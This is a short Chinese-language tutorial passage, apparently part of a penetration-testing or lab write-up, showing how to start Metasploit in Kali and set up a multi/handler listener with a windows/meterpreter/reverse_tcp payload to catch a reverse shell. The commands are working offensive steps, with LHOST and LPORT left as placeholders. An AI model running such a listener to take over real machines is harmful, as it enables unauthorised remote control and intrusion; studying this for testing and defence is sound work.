0x03:利用MSF获得shell


首先在kali输入msfconsole进入Metasploit


 

选用我们的经典模块multi/handler

命令:use exploit/multi/handler


接着设置经典的windows 反弹payload

命令:set payload windows/meterpreter/reverse_tcp


最后要设置LHOST、LPORT参数

set LHOST (要监听的本地IP）

set LPORT （要监听本地端口）

 设置好了以后我们自己run开始监听反弹shell
